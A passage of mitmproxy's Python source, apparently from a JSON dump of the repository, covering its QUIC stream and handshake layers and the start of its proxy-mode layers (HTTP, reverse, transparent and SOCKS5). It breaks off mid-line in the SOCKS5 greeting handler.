child_layer.flow.metadata[\"quic_initiator\"] = (\n                \"client\"\n                if stream_is_client_initiated(self._client_stream_id)\n                else \"server\"\n            )\n            child_layer.flow.metadata[\"quic_stream_id_client\"] = self._client_stream_id\n            child_layer.flow.metadata[\"quic_stream_id_server\"] = self._server_stream_id\n\n    def stream_id(self, client: bool) -> int | None:\n        return self._client_stream_id if client else self._server_stream_id\n\n\nclass RawQuicLayer(layer.Layer):\n    \"\"\"\n    This layer is responsible for de-multiplexing QUIC streams into an individual layer stack per stream.\n    \"\"\"\n\n    ignore: bool\n    \"\"\"Indicates whether traffic should be routed as-is.\"\"\"\n    datagram_layer: layer.Layer\n    \"\"\"\n    The layer that is handling datagrams over QUIC. It's like a child_layer, but with a forked context.\n    Instead of having a datagram-equivalent for all `QuicStream*` classes, we use `SendData` and `DataReceived` instead.\n    There is also no need for another `NextLayer` marker, as a missing `QuicStreamLayer` implies UDP,\n    and the connection state is the same as the one of the underlying QUIC connection.\n    \"\"\"\n    client_stream_ids: dict[int, QuicStreamLayer]\n    \"\"\"Maps stream IDs from the client connection to stream layers.\"\"\"\n    server_stream_ids: dict[int, QuicStreamLayer]\n    \"\"\"Maps stream IDs from the server connection to stream layers.\"\"\"\n    connections: dict[connection.Connection, layer.Layer]\n    \"\"\"Maps connections to layers.\"\"\"\n    command_sources: dict[commands.Command, layer.Layer]\n    \"\"\"Keeps track of blocking commands and wakeup requests.\"\"\"\n    next_stream_id: list[int]\n    \"\"\"List containing the next stream ID for all four is_unidirectional/is_client combinations.\"\"\"\n\n    def __init__(self, context: context.Context, ignore: bool = False) -> None:\n        super().__init__(context)\n        self.ignore = ignore\n        self.datagram_layer = (\n            UDPLayer(self.context.fork(), ignore=True)\n            if ignore\n            else layer.NextLayer(self.context.fork())\n        )\n        self.client_stream_ids = {}\n        self.server_stream_ids = {}\n        self.connections = {\n            context.client: self.datagram_layer,\n            context.server: self.datagram_layer,\n        }\n        self.command_sources = {}\n        self.next_stream_id = [0, 1, 2, 3]\n\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        # we treat the datagram layer as child layer, so forward Start\n        if isinstance(event, events.Start):\n            if self.context.server.timestamp_start is None:\n                err = yield commands.OpenConnection(self.context.server)\n                if err:\n                    yield commands.CloseConnection(self.context.client)\n                    self._handle_event = self.done  # type: ignore\n                    return\n            yield from self.event_to_child(self.datagram_layer, event)\n\n        # properly forward completion events based on their command\n        elif isinstance(event, events.CommandCompleted):\n            yield from self.event_to_child(\n                self.command_sources.pop(event.command), event\n            )\n\n        # route injected messages based on their connections (prefer client, fallback to server)\n        elif isinstance(event, events.MessageInjected):\n            if event.flow.client_conn in self.connections:\n                yield from self.event_to_child(\n                    self.connections[event.flow.client_conn], event\n                )\n            elif event.flow.server_conn in self.connections:\n                yield from self.event_to_child(\n                    self.connections[event.flow.server_conn], event\n                )\n            else:\n                raise AssertionError(f\"Flow not associated: {event.flow!r}\")\n\n        # handle stream events targeting this context\n        elif isinstance(event, QuicStreamEvent) and (\n            event.connection is self.context.client\n            or event.connection is self.context.server\n        ):\n            from_client = event.connection is self.context.client\n\n            # fetch or create the layer\n            stream_ids = (\n                self.client_stream_ids if from_client else self.server_stream_ids\n            )\n            if event.stream_id in stream_ids:\n                stream_layer = stream_ids[event.stream_id]\n            else:\n                # ensure we haven't just forgotten to register the ID\n                assert stream_is_client_initiated(event.stream_id) == from_client\n\n                # for server-initiated streams we need to open the client as well\n                if from_client:\n                    client_stream_id = event.stream_id\n                    server_stream_id = None\n                else:\n                    client_stream_id = self.get_next_available_stream_id(\n                        is_client=False,\n                        is_unidirectional=stream_is_unidirectional(event.stream_id),\n                    )\n                    server_stream_id = event.stream_id\n\n                # create, register and start the layer\n                stream_layer = QuicStreamLayer(\n                    self.context.fork(), self.ignore, client_stream_id\n                )\n                self.client_stream_ids[client_stream_id] = stream_layer\n                if server_stream_id is not None:\n                    stream_layer.open_server_stream(server_stream_id)\n                    self.server_stream_ids[server_stream_id] = stream_layer\n                self.connections[stream_layer.client] = stream_layer\n                self.connections[stream_layer.server] = stream_layer\n                yield from self.event_to_child(stream_layer, events.Start())\n\n            # forward data and close events\n            conn = stream_layer.client if from_client else stream_layer.server\n            if isinstance(event, QuicStreamDataReceived):\n                if event.data:\n                    yield from self.event_to_child(\n                        stream_layer, events.DataReceived(conn, event.data)\n                    )\n                if event.end_stream:\n                    yield from self.close_stream_layer(stream_layer, from_client)\n            elif isinstance(event, QuicStreamReset):\n                # preserve stream resets\n                for command in self.close_stream_layer(stream_layer, from_client):\n                    if (\n                        isinstance(command, SendQuicStreamData)\n                        and command.stream_id == stream_layer.stream_id(not from_client)\n                        and command.end_stream\n                        and not command.data\n                    ):\n                        yield ResetQuicStream(\n                            command.connection, command.stream_id, event.error_code\n                        )\n                    else:\n                        yield command\n            else:\n                raise AssertionError(f\"Unexpected stream event: {event!r}\")\n\n        # handle close events that target this context\n        elif isinstance(event, QuicConnectionClosed) and (\n            event.connection is self.context.client\n            or event.connection is self.context.server\n        ):\n            from_client = event.connection is self.context.client\n            other_conn = self.context.server if from_client else self.context.client\n\n            # be done if both connections are closed\n            if other_conn.connected:\n                yield CloseQuicConnection(\n                    other_conn, event.error_code, event.frame_type, event.reason_phrase\n                )\n            else:\n                self._handle_event = self.done  # type: ignore\n\n            # always forward to the datagram layer and swallow `CloseConnection` commands\n            for command in self.event_to_child(self.datagram_layer, event):\n                if (\n                    not isinstance(command, commands.CloseConnection)\n                    or command.connection is not other_conn\n                ):\n                    yield command\n\n            # forward to either the client or server connection of stream layers and swallow empty stream end\n            for conn, child_layer in self.connections.items():\n                if isinstance(child_layer, QuicStreamLayer) and (\n                    (conn is child_layer.client)\n                    if from_client\n                    else (conn is child_layer.server)\n                ):\n                    conn.state &= ~connection.ConnectionState.CAN_WRITE\n                    for command in self.close_stream_layer(child_layer, from_client):\n                        if not isinstance(command, SendQuicStreamData) or command.data:\n                            yield command\n\n        # all other connection events are routed to their corresponding layer\n        elif isinstance(event, events.ConnectionEvent):\n            yield from self.event_to_child(self.connections[event.connection], event)\n\n        else:\n            raise AssertionError(f\"Unexpected event: {event!r}\")\n\n    def close_stream_layer(\n        self, stream_layer: QuicStreamLayer, client: bool\n    ) -> layer.CommandGenerator[None]:\n        \"\"\"Closes the incoming part of a connection.\"\"\"\n\n        conn = stream_layer.client if client else stream_layer.server\n        conn.state &= ~connection.ConnectionState.CAN_READ\n        assert conn.timestamp_start is not None\n        if conn.timestamp_end is None:\n            conn.timestamp_end = time.time()\n            yield from self.event_to_child(stream_layer, events.ConnectionClosed(conn))\n\n    def event_to_child(\n        self, child_layer: layer.Layer, event: events.Event\n    ) -> layer.CommandGenerator[None]:\n        \"\"\"Forwards events to child layers and translates commands.\"\"\"\n\n        for command in child_layer.handle_event(event):\n            # intercept commands for streams connections\n            if (\n                isinstance(child_layer, QuicStreamLayer)\n                and isinstance(command, commands.ConnectionCommand)\n                and (\n                    command.connection is child_layer.client\n                    or command.connection is child_layer.server\n                )\n            ):\n                # get the target connection and stream ID\n                to_client = command.connection is child_layer.client\n                quic_conn = self.context.client if to_client else self.context.server\n                stream_id = child_layer.stream_id(to_client)\n\n                # write data and check CloseConnection wasn't called before\n                if isinstance(command, commands.SendData):\n                    assert stream_id is not None\n                    if command.connection.state & connection.ConnectionState.CAN_WRITE:\n                        yield SendQuicStreamData(quic_conn, stream_id, command.data)\n\n                # send a FIN and optionally also a STOP frame\n                elif isinstance(command, commands.CloseConnection):\n                    assert stream_id is not None\n                    if command.connection.state & connection.ConnectionState.CAN_WRITE:\n                        command.connection.state &= (\n                            ~connection.ConnectionState.CAN_WRITE\n                        )\n                        yield SendQuicStreamData(\n                            quic_conn, stream_id, b\"\", end_stream=True\n                        )\n                    # XXX: Use `command.connection.state & connection.ConnectionState.CAN_READ` instead?\n                    only_close_our_half = (\n                        isinstance(command, commands.CloseTcpConnection)\n                        and command.half_close\n                    )\n                    if not only_close_our_half:\n                        if stream_is_client_initiated(\n                            stream_id\n                        ) == to_client or not stream_is_unidirectional(stream_id):\n                            yield StopQuicStream(\n                                quic_conn, stream_id, QuicErrorCode.NO_ERROR\n                            )\n                        yield from self.close_stream_layer(child_layer, to_client)\n\n                # open server connections by reserving the next stream ID\n                elif isinstance(command, commands.OpenConnection):\n                    assert not to_client\n                    assert stream_id is None\n                    client_stream_id = child_layer.stream_id(client=True)\n                    assert client_stream_id is not None\n                    stream_id = self.get_next_available_stream_id(\n                        is_client=True,\n                        is_unidirectional=stream_is_unidirectional(client_stream_id),\n                    )\n                    child_layer.open_server_stream(stream_id)\n                    self.server_stream_ids[stream_id] = child_layer\n                    yield from self.event_to_child(\n                        child_layer, events.OpenConnectionCompleted(command, None)\n                    )\n\n                else:\n                    raise AssertionError(\n                        f\"Unexpected stream connection command: {command!r}\"\n                    )\n\n            # remember blocking and wakeup commands\n            else:\n                if command.blocking or isinstance(command, commands.RequestWakeup):\n                    self.command_sources[command] = child_layer\n                if isinstance(command, commands.OpenConnection):\n                    self.connections[command.connection] = child_layer\n                yield command\n\n    def get_next_available_stream_id(\n        self, is_client: bool, is_unidirectional: bool = False\n    ) -> int:\n        index = (int(is_unidirectional) << 1) | int(not is_client)\n        stream_id = self.next_stream_id[index]\n        self.next_stream_id[index] = stream_id + 4\n        return stream_id\n\n    def done(self, _) -> layer.CommandGenerator[None]:  # pragma: no cover\n        yield from ()\n\n\nclass QuicLayer(tunnel.TunnelLayer):\n    quic: QuicConnection | None = None\n    tls: QuicTlsSettings | None = None\n\n    def __init__(\n        self,\n        context: context.Context,\n        conn: connection.Connection,\n        time: Callable[[], float] | None,\n    ) -> None:\n        super().__init__(context, tunnel_connection=conn, conn=conn)\n        self.child_layer = layer.NextLayer(self.context, ask_on_start=True)\n        self._time = time or ctx.master.event_loop.time\n        self._wakeup_commands: dict[commands.RequestWakeup, float] = dict()\n        conn.tls = True\n\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if isinstance(event, events.Wakeup) and event.command in self._wakeup_commands:\n            # TunnelLayer has no understanding of wakeups, so we turn this into an empty DataReceived event\n            # which TunnelLayer recognizes as belonging to our connection.\n            assert self.quic\n            scheduled_time = self._wakeup_commands.pop(event.command)\n            if self.quic._state is not QuicConnectionState.TERMINATED:\n                # weird quirk: asyncio sometimes returns a bit ahead of time.\n                now = max(scheduled_time, self._time())\n                self.quic.handle_timer(now)\n                yield from super()._handle_event(\n                    events.DataReceived(self.tunnel_connection, b\"\")\n                )\n        else:\n            yield from super()._handle_event(event)\n\n    def event_to_child(self, event: events.Event) -> layer.CommandGenerator[None]:\n        # the parent will call _handle_command multiple times, we transmit cumulative afterwards\n        # this will reduce the number of sends, especially if data=b\"\" and end_stream=True\n        yield from super().event_to_child(event)\n        if self.quic:\n            yield from self.tls_interact()\n\n    def _handle_command(\n        self, command: commands.Command\n    ) -> layer.CommandGenerator[None]:\n        \"\"\"Turns stream commands into aioquic connection invocations.\"\"\"\n        if isinstance(command, QuicStreamCommand) and command.connection is self.conn:\n            assert self.quic\n            if isinstance(command, SendQuicStreamData):\n                self.quic.send_stream_data(\n                    command.stream_id, command.data, command.end_stream\n                )\n            elif isinstance(command, ResetQuicStream):\n                self.quic.reset_stream(command.stream_id, command.error_code)\n            elif isinstance(command, StopQuicStream):\n                # the stream might have already been closed, check before stopping\n                if command.stream_id in self.quic._streams:\n                    self.quic.stop_stream(command.stream_id, command.error_code)\n            else:\n                raise AssertionError(f\"Unexpected stream command: {command!r}\")\n        else:\n            yield from super()._handle_command(command)\n\n    def start_tls(\n        self, original_destination_connection_id: bytes | None\n    ) -> layer.CommandGenerator[None]:\n        \"\"\"Initiates the aioquic connection.\"\"\"\n\n        # must only be called if QUIC is uninitialized\n        assert not self.quic\n        assert not self.tls\n\n        # query addons to provide the necessary TLS settings\n        tls_data = QuicTlsData(self.conn, self.context)\n        if self.conn is self.context.client:\n            yield QuicStartClientHook(tls_data)\n        else:\n            yield QuicStartServerHook(tls_data)\n        if not tls_data.settings:\n            yield commands.Log(\n                f\"No QUIC context was provided, failing connection.\", ERROR\n            )\n            yield commands.CloseConnection(self.conn)\n            return\n\n        # build the aioquic connection\n        configuration = tls_settings_to_configuration(\n            settings=tls_data.settings,\n            is_client=self.conn is self.context.server,\n            server_name=self.conn.sni,\n        )\n        self.quic = QuicConnection(\n            configuration=configuration,\n            original_destination_connection_id=original_destination_connection_id,\n        )\n        self.tls = tls_data.settings\n\n        # if we act as client, connect to upstream\n        if original_destination_connection_id is None:\n            self.quic.connect(self.conn.peername, now=self._time())\n            yield from self.tls_interact()\n\n    def tls_interact(self) -> layer.CommandGenerator[None]:\n        \"\"\"Retrieves all pending outgoing packets from aioquic and sends the data.\"\"\"\n\n        # send all queued datagrams\n        assert self.quic\n        now = self._time()\n\n        for data, addr in self.quic.datagrams_to_send(now=now):\n            assert addr == self.conn.peername\n            yield commands.SendData(self.tunnel_connection, data)\n\n        timer = self.quic.get_timer()\n        if timer is not None:\n            # smooth wakeups a bit.\n            smoothed = timer + 0.002\n            # request a new wakeup if all pending requests trigger at a later time\n            if not any(\n                existing <= smoothed for existing in self._wakeup_commands.values()\n            ):\n                command = commands.RequestWakeup(timer - now)\n                self._wakeup_commands[command] = timer\n                yield command\n\n    def receive_handshake_data(\n        self, data: bytes\n    ) -> layer.CommandGenerator[tuple[bool, str | None]]:\n        assert self.quic\n\n        # forward incoming data to aioquic\n        if data:\n            self.quic.receive_datagram(data, self.conn.peername, now=self._time())\n\n        # handle pre-handshake events\n        while event := self.quic.next_event():\n            if isinstance(event, quic_events.ConnectionTerminated):\n                err = event.reason_phrase or error_code_to_str(event.error_code)\n                return False, err\n            elif isinstance(event, quic_events.HandshakeCompleted):\n                # concatenate all peer certificates\n                all_certs: list[x509.Certificate] = []\n                if self.quic.tls._peer_certificate:\n                    all_certs.append(self.quic.tls._peer_certificate)\n                all_certs.extend(self.quic.tls._peer_certificate_chain)\n\n                # set the connection's TLS properties\n                self.conn.timestamp_tls_setup = time.time()\n                if event.alpn_protocol:\n                    self.conn.alpn = event.alpn_protocol.encode(\"ascii\")\n                self.conn.certificate_list = [certs.Cert(cert) for cert in all_certs]\n                assert self.quic.tls.key_schedule\n                self.conn.cipher = self.quic.tls.key_schedule.cipher_suite.name\n                self.conn.tls_version = \"QUIC\"\n\n                # log the result and report the success to addons\n                if self.debug:\n                    yield commands.Log(\n                        f\"{self.debug}[quic] tls established: {self.conn}\", DEBUG\n                    )\n                if self.conn is self.context.client:\n                    yield TlsEstablishedClientHook(\n                        QuicTlsData(self.conn, self.context, settings=self.tls)\n                    )\n                else:\n                    yield TlsEstablishedServerHook(\n                        QuicTlsData(self.conn, self.context, settings=self.tls)\n                    )\n\n                yield from self.tls_interact()\n                return True, None\n            elif isinstance(\n                event,\n                (\n                    quic_events.ConnectionIdIssued,\n                    quic_events.ConnectionIdRetired,\n                    quic_events.PingAcknowledged,\n                    quic_events.ProtocolNegotiated,\n                ),\n            ):\n                pass\n            else:\n                raise AssertionError(f\"Unexpected event: {event!r}\")\n\n        # transmit buffered data and re-arm timer\n        yield from self.tls_interact()\n        return False, None\n\n    def on_handshake_error(self, err: str) -> layer.CommandGenerator[None]:\n        self.conn.error = err\n        if self.conn is self.context.client:\n            yield TlsFailedClientHook(\n                QuicTlsData(self.conn, self.context, settings=self.tls)\n            )\n        else:\n            yield TlsFailedServerHook(\n                QuicTlsData(self.conn, self.context, settings=self.tls)\n            )\n        yield from super().on_handshake_error(err)\n\n    def receive_data(self, data: bytes) -> layer.CommandGenerator[None]:\n        assert self.quic\n\n        # forward incoming data to aioquic\n        if data:\n            self.quic.receive_datagram(data, self.conn.peername, now=self._time())\n\n        # handle post-handshake events\n        while event := self.quic.next_event():\n            if isinstance(event, quic_events.ConnectionTerminated):\n                if self.debug:\n                    reason = event.reason_phrase or error_code_to_str(event.error_code)\n                    yield commands.Log(\n                        f\"{self.debug}[quic] close_notify {self.conn} (reason={reason})\",\n                        DEBUG,\n                    )\n                # We don't rely on `ConnectionTerminated` to dispatch `QuicConnectionClosed`, because\n                # after aioquic receives a termination frame, it still waits for the next `handle_timer`\n                # before returning `ConnectionTerminated` in `next_event`. In the meantime, the underlying\n                # connection could be closed. Therefore, we instead dispatch on `ConnectionClosed` and simply\n                # close the connection here.\n                yield commands.CloseConnection(self.tunnel_connection)\n                return  # we don't handle any further events, nor do/can we transmit data, so exit\n            elif isinstance(event, quic_events.DatagramFrameReceived):\n                yield from self.event_to_child(\n                    events.DataReceived(self.conn, event.data)\n                )\n            elif isinstance(event, quic_events.StreamDataReceived):\n                yield from self.event_to_child(\n                    QuicStreamDataReceived(\n                        self.conn, event.stream_id, event.data, event.end_stream\n                    )\n                )\n            elif isinstance(event, quic_events.StreamReset):\n                yield from self.event_to_child(\n                    QuicStreamReset(self.conn, event.stream_id, event.error_code)\n                )\n            elif isinstance(\n                event,\n                (\n                    quic_events.ConnectionIdIssued,\n                    quic_events.ConnectionIdRetired,\n                    quic_events.PingAcknowledged,\n                    quic_events.ProtocolNegotiated,\n                ),\n            ):\n                pass\n            else:\n                raise AssertionError(f\"Unexpected event: {event!r}\")\n\n        # transmit buffered data and re-arm timer\n        yield from self.tls_interact()\n\n    def receive_close(self) -> layer.CommandGenerator[None]:\n        assert self.quic\n        # if `_close_event` is not set, the underlying connection has been closed\n        # we turn this into a QUIC close event as well\n        close_event = self.quic._close_event or quic_events.ConnectionTerminated(\n            QuicErrorCode.NO_ERROR, None, \"Connection closed.\"\n        )\n        yield from self.event_to_child(\n            QuicConnectionClosed(\n                self.conn,\n                close_event.error_code,\n                close_event.frame_type,\n                close_event.reason_phrase,\n            )\n        )\n\n    def send_data(self, data: bytes) -> layer.CommandGenerator[None]:\n        # non-stream data uses datagram frames\n        assert self.quic\n        if data:\n            self.quic.send_datagram_frame(data)\n        yield from self.tls_interact()\n\n    def send_close(\n        self, command: commands.CloseConnection\n    ) -> layer.CommandGenerator[None]:\n        # properly close the QUIC connection\n        if self.quic:\n            if isinstance(command, CloseQuicConnection):\n                self.quic.close(\n                    command.error_code, command.frame_type, command.reason_phrase\n                )\n            else:\n                self.quic.close()\n            yield from self.tls_interact()\n        yield from super().send_close(command)\n\n\nclass ServerQuicLayer(QuicLayer):\n    \"\"\"\n    This layer establishes QUIC for a single server connection.\n    \"\"\"\n\n    wait_for_clienthello: bool = False\n\n    def __init__(\n        self,\n        context: context.Context,\n        conn: connection.Server | None = None,\n        time: Callable[[], float] | None = None,\n    ):\n        super().__init__(context, conn or context.server, time)\n\n    def start_handshake(self) -> layer.CommandGenerator[None]:\n        wait_for_clienthello = not self.command_to_reply_to and isinstance(\n            self.child_layer, ClientQuicLayer\n        )\n        if wait_for_clienthello:\n            self.wait_for_clienthello = True\n            self.tunnel_state = tunnel.TunnelState.CLOSED\n        else:\n            yield from self.start_tls(None)\n\n    def event_to_child(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if self.wait_for_clienthello:\n            for command in super().event_to_child(event):\n                if (\n                    isinstance(command, commands.OpenConnection)\n                    and command.connection == self.conn\n                ):\n                    self.wait_for_clienthello = False\n                else:\n                    yield command\n        else:\n            yield from super().event_to_child(event)\n\n    def on_handshake_error(self, err: str) -> layer.CommandGenerator[None]:\n        yield commands.Log(f\"Server QUIC handshake failed. {err}\", level=WARNING)\n        yield from super().on_handshake_error(err)\n\n\nclass ClientQuicLayer(QuicLayer):\n    \"\"\"\n    This layer establishes QUIC on a single client connection.\n    \"\"\"\n\n    server_tls_available: bool\n    \"\"\"Indicates whether the parent layer is a ServerQuicLayer.\"\"\"\n\n    def __init__(\n        self, context: context.Context, time: Callable[[], float] | None = None\n    ) -> None:\n        # same as ClientTLSLayer, we might be nested in some other transport\n        if context.client.tls:\n            context.client.alpn = None\n            context.client.cipher = None\n            context.client.sni = None\n            context.client.timestamp_tls_setup = None\n            context.client.tls_version = None\n            context.client.certificate_list = []\n            context.client.mitmcert = None\n            context.client.alpn_offers = []\n            context.client.cipher_list = []\n\n        super().__init__(context, context.client, time)\n        self.server_tls_available = len(self.context.layers) >= 2 and isinstance(\n            self.context.layers[-2], ServerQuicLayer\n        )\n\n    def start_handshake(self) -> layer.CommandGenerator[None]:\n        yield from ()\n\n    def receive_handshake_data(\n        self, data: bytes\n    ) -> layer.CommandGenerator[tuple[bool, str | None]]:\n        if isinstance(self.context.layers[0], TransparentProxy):  # pragma: no cover\n            yield commands.Log(\n                f\"Swallowing QUIC handshake because HTTP/3 does not support transparent mode yet.\",\n                DEBUG,\n            )\n            return False, None\n        if not self.context.options.http3:\n            yield commands.Log(\n                f\"Swallowing QUIC handshake because HTTP/3 is disabled.\", DEBUG\n            )\n            return False, None\n\n        # if we already had a valid client hello, don't process further packets\n        if self.tls:\n            return (yield from super().receive_handshake_data(data))\n\n        # fail if the received data is not a QUIC packet\n        buffer = QuicBuffer(data=data)\n        try:\n            header = pull_quic_header(buffer)\n        except TypeError:\n            return False, f\"Cannot parse QUIC header: Malformed head ({data.hex()})\"\n        except ValueError as e:\n            return False, f\"Cannot parse QUIC header: {e} ({data.hex()})\"\n\n        # negotiate version, support all versions known to aioquic\n        supported_versions = [\n            version.value\n            for version in QuicProtocolVersion\n            if version is not QuicProtocolVersion.NEGOTIATION\n        ]\n        if header.version is not None and header.version not in supported_versions:\n            yield commands.SendData(\n                self.tunnel_connection,\n                encode_quic_version_negotiation(\n                    source_cid=header.destination_cid,\n                    destination_cid=header.source_cid,\n                    supported_versions=supported_versions,\n                ),\n            )\n            return False, None\n\n        # ensure it's (likely) a client handshake packet\n        if len(data) < 1200 or header.packet_type != PACKET_TYPE_INITIAL:\n            return (\n                False,\n                f\"Invalid handshake received, roaming not supported. ({data.hex()})\",\n            )\n\n        # extract the client hello\n        try:\n            client_hello = quic_parse_client_hello(data)\n        except ValueError as e:\n            return False, f\"Cannot parse ClientHello: {str(e)} ({data.hex()})\"\n\n        # copy the client hello information\n        self.conn.sni = client_hello.sni\n        self.conn.alpn_offers = client_hello.alpn_protocols\n\n        # check with addons what we shall do\n        tls_clienthello = ClientHelloData(self.context, client_hello)\n        yield TlsClienthelloHook(tls_clienthello)\n\n        # replace the QUIC layer with an UDP layer if requested\n        if tls_clienthello.ignore_connection:\n            self.conn = self.tunnel_connection = connection.Client(\n                peername=(\"ignore-conn\", 0),\n                sockname=(\"ignore-conn\", 0),\n                transport_protocol=\"udp\",\n                state=connection.ConnectionState.OPEN,\n            )\n\n            # we need to replace the server layer as well, if there is one\n            parent_layer = self.context.layers[self.context.layers.index(self) - 1]\n            if isinstance(parent_layer, ServerQuicLayer):\n                parent_layer.conn = parent_layer.tunnel_connection = connection.Server(\n                    address=None\n                )\n            replacement_layer = UDPLayer(self.context, ignore=True)\n            parent_layer.handle_event = replacement_layer.handle_event  # type: ignore\n            parent_layer._handle_event = replacement_layer._handle_event  # type: ignore\n            yield from parent_layer.handle_event(events.Start())\n            yield from parent_layer.handle_event(\n                events.DataReceived(self.context.client, data)\n            )\n            return True, None\n\n        # start the server QUIC connection if demanded and available\n        if (\n            tls_clienthello.establish_server_tls_first\n            and not self.context.server.tls_established\n        ):\n            err = yield from self.start_server_tls()\n            if err:\n                yield commands.Log(\n                    f\"Unable to establish QUIC connection with server ({err}). \"\n                    f\"Trying to establish QUIC with client anyway. \"\n                    f\"If you plan to redirect requests away from this server, \"\n                    f\"consider setting `connection_strategy` to `lazy` to suppress early connections.\"\n                )\n\n        # start the client QUIC connection\n        yield from self.start_tls(header.destination_cid)\n        # XXX copied from TLS, we assume that `CloseConnection` in `start_tls` takes effect immediately\n        if not self.conn.connected:\n            return False, \"connection closed early\"\n\n        # send the client hello to aioquic\n        return (yield from super().receive_handshake_data(data))\n\n    def start_server_tls(self) -> layer.CommandGenerator[str | None]:\n        if not self.server_tls_available:\n            return f\"No server QUIC available.\"\n        err = yield commands.OpenConnection(self.context.server)\n        return err\n\n    def on_handshake_error(self, err: str) -> layer.CommandGenerator[None]:\n        yield commands.Log(f\"Client QUIC handshake failed. {err}\", level=WARNING)\n        yield from super().on_handshake_error(err)\n        self.event_to_child = self.errored  # type: ignore\n\n    def errored(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if self.debug is not None:\n            yield commands.Log(\n                f\"{self.debug}[quic] Swallowing {event} as handshake failed.\", DEBUG\n            )\n", "mitmproxy/proxy/layers/modes.py": "from __future__ import annotations\n\nimport socket\nimport struct\nimport sys\nfrom abc import ABCMeta\nfrom collections.abc import Callable\nfrom dataclasses import dataclass\n\nfrom mitmproxy import connection\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.commands import StartHook\nfrom mitmproxy.proxy.mode_specs import ReverseMode\nfrom mitmproxy.proxy.utils import expect\n\nif sys.version_info < (3, 11):\n    from typing_extensions import assert_never\nelse:\n    from typing import assert_never\n\n\nclass HttpProxy(layer.Layer):\n    @expect(events.Start)\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        child_layer = layer.NextLayer(self.context)\n        self._handle_event = child_layer.handle_event\n        yield from child_layer.handle_event(event)\n\n\nclass HttpUpstreamProxy(layer.Layer):\n    @expect(events.Start)\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        child_layer = layer.NextLayer(self.context)\n        self._handle_event = child_layer.handle_event\n        yield from child_layer.handle_event(event)\n\n\nclass DestinationKnown(layer.Layer, metaclass=ABCMeta):\n    \"\"\"Base layer for layers that gather connection destination info and then delegate.\"\"\"\n\n    child_layer: layer.Layer\n\n    def finish_start(self) -> layer.CommandGenerator[str | None]:\n        if (\n            self.context.options.connection_strategy == \"eager\"\n            and self.context.server.address\n            and self.context.server.transport_protocol == \"tcp\"\n        ):\n            err = yield commands.OpenConnection(self.context.server)\n            if err:\n                self._handle_event = self.done  # type: ignore\n                return err\n\n        self._handle_event = self.child_layer.handle_event  # type: ignore\n        yield from self.child_layer.handle_event(events.Start())\n        return None\n\n    @expect(events.DataReceived, events.ConnectionClosed)\n    def done(self, _) -> layer.CommandGenerator[None]:\n        yield from ()\n\n\nclass ReverseProxy(DestinationKnown):\n    @expect(events.Start)\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        spec = self.context.client.proxy_mode\n        assert isinstance(spec, ReverseMode)\n        self.context.server.address = spec.address\n\n        self.child_layer = layer.NextLayer(self.context)\n\n        # For secure protocols, set SNI if keep_host_header is false\n        match spec.scheme:\n            case \"http3\" | \"quic\" | \"https\" | \"tls\" | \"dtls\":\n                if not self.context.options.keep_host_header:\n                    self.context.server.sni = spec.address[0]\n            case \"tcp\" | \"http\" | \"udp\" | \"dns\":\n                pass\n            case _:  # pragma: no cover\n                assert_never(spec.scheme)\n\n        err = yield from self.finish_start()\n        if err:\n            yield commands.CloseConnection(self.context.client)\n\n\nclass TransparentProxy(DestinationKnown):\n    @expect(events.Start)\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        assert self.context.server.address, \"No server address set.\"\n        self.child_layer = layer.NextLayer(self.context)\n        err = yield from self.finish_start()\n        if err:\n            yield commands.CloseConnection(self.context.client)\n\n\nSOCKS5_VERSION = 0x05\n\nSOCKS5_METHOD_NO_AUTHENTICATION_REQUIRED = 0x00\nSOCKS5_METHOD_USER_PASSWORD_AUTHENTICATION = 0x02\nSOCKS5_METHOD_NO_ACCEPTABLE_METHODS = 0xFF\n\nSOCKS5_ATYP_IPV4_ADDRESS = 0x01\nSOCKS5_ATYP_DOMAINNAME = 0x03\nSOCKS5_ATYP_IPV6_ADDRESS = 0x04\n\nSOCKS5_REP_HOST_UNREACHABLE = 0x04\nSOCKS5_REP_COMMAND_NOT_SUPPORTED = 0x07\nSOCKS5_REP_ADDRESS_TYPE_NOT_SUPPORTED = 0x08\n\n\n@dataclass\nclass Socks5AuthData:\n    client_conn: connection.Client\n    username: str\n    password: str\n    valid: bool = False\n\n\n@dataclass\nclass Socks5AuthHook(StartHook):\n    \"\"\"\n    Mitmproxy has received username/password SOCKS5 credentials.\n\n    This hook decides whether they are valid by setting `data.valid`.\n    \"\"\"\n\n    data: Socks5AuthData\n\n\nclass Socks5Proxy(DestinationKnown):\n    buf: bytes = b\"\"\n\n    def socks_err(\n        self,\n        message: str,\n        reply_code: int | None = None,\n    ) -> layer.CommandGenerator[None]:\n        if reply_code is not None:\n            yield commands.SendData(\n                self.context.client,\n                bytes([SOCKS5_VERSION, reply_code])\n                + b\"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\",\n            )\n        yield commands.CloseConnection(self.context.client)\n        yield commands.Log(message)\n        self._handle_event = self.done\n\n    @expect(events.Start, events.DataReceived, events.ConnectionClosed)\n    def _handle_event(self, event: events.Event) -> layer.CommandGenerator[None]:\n        if isinstance(event, events.Start):\n            pass\n        elif isinstance(event, events.DataReceived):\n            self.buf += event.data\n            yield from self.state()\n        elif isinstance(event, events.ConnectionClosed):\n            if self.buf:\n                yield commands.Log(\n                    f\"Client closed connection before completing SOCKS5 handshake: {self.buf!r}\"\n                )\n            yield commands.CloseConnection(event.connection)\n        else:\n            raise AssertionError(f\"Unknown event: {event}\")\n\n    def state_greet(self) -> layer.CommandGenerator[None]:\n        if len(self.buf) < 2:\n            return\n\n        if self.buf[0] != SOCKS5_VERSION:\n            if self.buf[:3].isupper():\n                guess = \"Probably not a SOCKS request but a regular HTTP request. \"\n            else:\n                guess = \"\"\n            yield from self.socks_err(\n                guess + \"Invalid SOCKS version. Expected 0x05, got 0x%x\" % self.buf[0]\n            )\n            return\n\n        n_methods = self.buf[1]\n        if len(self.buf) < 2 + n_methods:\n            return\n\n        if \"proxyauth\" in self.context.options and 